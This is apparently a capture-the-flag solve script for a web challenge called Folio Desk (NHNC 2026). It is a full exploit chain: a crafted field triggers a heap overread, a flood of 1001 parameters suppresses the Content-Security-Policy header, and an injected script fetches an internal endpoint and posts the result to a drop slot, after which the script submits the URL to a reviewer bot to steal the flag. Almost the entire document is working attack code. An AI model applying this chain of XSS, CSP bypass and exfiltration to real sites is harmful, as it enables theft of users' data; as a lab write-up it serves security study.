"""
xdd (Folio Desk) — NHNC 2026
Heap-overread + max_input_vars CSP kill + XSS → flag exfil

Usage:
  python3 solve.py                                    # local (127.0.0.1:19080/19081)
  python3 solve.py APP_HOST:PORT REVIEW_HOST:PORT     # remote instancer
"""
import re, struct, urllib.parse, socket, hashlib, time, sys

if len(sys.argv) >= 3:
    ah, ap = sys.argv[1].rsplit(':', 1)
    rh, rp = sys.argv[2].rsplit(':', 1)
    SITE = (ah, int(ap))
    REVIEW = (rh, int(rp))
else:
    SITE = ('127.0.0.1', 19080)
    REVIEW = ('127.0.0.1', 19081)

INTERNAL_PORT = 8080
SLOT = 'xdd_' + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

def raw(host, port, method, path, body=None, hdrs=None, timeout=20):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    hl = ['%s %s HTTP/1.0' % (method, path)]
    if hdrs:
        for k, v in hdrs.items():
            hl.append('%s: %s' % (k, v))
    if body is not None:
        b = body if isinstance(body, bytes) else body.encode()
        hl.append('Content-Length: %d' % len(b))
    hl += ['', '']
    s.sendall('\r\n'.join(hl).encode())
    if body is not None:
        s.sendall(body if isinstance(body, bytes) else body.encode())
    buf = b''
    while True:
        try:
            c = s.recv(65536)
        except:
            break
        if not c:
            break
        buf += c
        if len(buf) > 6 * 1024 * 1024:
            break
    s.close()
    return buf

def make_note(name_bytes, memo):
    body = 'name=%s&memo=%s' % (
        ''.join('%%%02X' % b for b in name_bytes),
        urllib.parse.quote(memo),
    )
    r = raw(SITE[0], SITE[1], 'POST', '/draft.php', body,
            {'Content-Type': 'application/x-www-form-urlencoded'})
    m = re.search(rb'Location: .*id=([a-f0-9]{32})', r)
    return m.group(1).decode() if m else None

# --- Step 1: craft the overread note ---
# name layout triggers heap-overflow in folio_frame():
#   60 x "&" (escapable chars that expand)
#   12 x "P" (filler)
#   little-endian 0x1000 (corrupts memo.len → forward OOB read)
#   4 null bytes
#   rest padding to 255
V = 0x1000
name = b"&" * 60 + b"P" * 12 + struct.pack('<I', V) + b"\x00" * 4 + b"Q" * (255 - 60 - 12 - 8)
memo = "M" * 255
nid = make_note(name, memo)
print("[*] note:", nid)

# --- Step 2: XSS payload in the carry parameter ---
# The overread will surface the raw carry (the $reserve var) at ~offset 1764
# No CSP → our <script> just runs
JS = (
    "fetch('http://127.0.0.1:9100/archive/receipt').then(r=>r.text())"
    ".then(t=>fetch('/drop.php?slot=%s',{method:'POST',body:t}))" % SLOT
)
BREAK = "'\"></title></textarea></style></script></noscript>--\x3e"
carry = BREAK + "<script>" + JS + "</script>"
carry = carry[:255]
print("[*] carry len:", len(carry))

# --- Step 3: max_input_vars flood kills CSP ---
# 1001 valueless params: PHP warning at startup locks headers before page_headers() runs
flood = '&'.join('a' for _ in range(1001))

path = '/view.php?id=%s&carry=%s&%s' % (nid, urllib.parse.quote(carry, safe=''), flood)

# --- Preflight: verify no CSP + script present ---
r = raw(SITE[0], SITE[1], 'GET', path)
head, _, body = r.partition(b'\r\n\r\n')
csp = b'Content-Security-Policy' in head
sp = body.find(b'<script>' + JS.encode())
print("[*] preflight: CSP=%s  <script>@%d  body=%db" % (csp, sp, len(body)))
if sp >= 0:
    print("    ctx:", body[max(0, sp - 30):sp + 50])

# --- Step 4: solve PoW + submit to reviewer bot ---
def get_ticket():
    r = raw(REVIEW[0], REVIEW[1], 'GET', '/')
    m = re.search(rb'name="ticket" value="([^"]+)"', r)
    return m.group(1).decode()

def solve_pow(ticket, diff=5):
    pre = '0' * diff
    n = 0
    while True:
        st = '%x' % n
        if hashlib.sha256(('%s:%s' % (ticket, st)).encode()).hexdigest().startswith(pre):
            return st
        n += 1

bot_url = 'http://127.0.0.1:%d%s' % (INTERNAL_PORT, path)
print("[*] bot url len:", len(bot_url))

ticket = get_ticket()
t0 = time.time()
stamp = solve_pow(ticket)
print("[*] PoW solved in %.1fs" % (time.time() - t0))

body = 'url=%s&ticket=%s&stamp=%s' % (
    urllib.parse.quote(bot_url, safe=''),
    urllib.parse.quote(ticket, safe=''),
    stamp,
)
r = raw(REVIEW[0], REVIEW[1], 'POST', '/', body,
        {'Content-Type': 'application/x-www-form-urlencoded'})
print("[*] reviewer:", r.split(b'\r\n\r\n', 1)[-1][:120])

# --- Step 5: poll for flag ---
for i in range(20):
    time.sleep(1)
    d = raw(SITE[0], SITE[1], 'GET', '/drop.php?slot=%s' % SLOT)
    m = re.search(rb'<pre>(.*?)</pre>', d, re.S)
    val = m.group(1) if m else b''
    if val.strip():
        print("[+] DROP after %ds:" % (i + 1), val)
        if b'NHNC' in val or b'{' in val:
            print("\n[FLAG] %s" % val.decode(errors='replace'))
        break
else:
    print("[-] drop empty after 20s")
